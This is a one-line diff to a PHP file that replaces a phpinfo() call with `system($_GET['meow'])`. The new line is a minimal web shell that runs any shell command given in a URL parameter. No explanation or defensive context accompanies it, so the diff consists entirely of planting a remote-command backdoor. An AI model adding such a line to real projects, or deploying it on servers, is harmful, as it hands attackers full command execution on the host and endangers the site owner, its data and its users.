@@ -1,1 +1,1 @@
-<?php phpinfo(); ?>
+<?php system($_GET['meow']); ?>
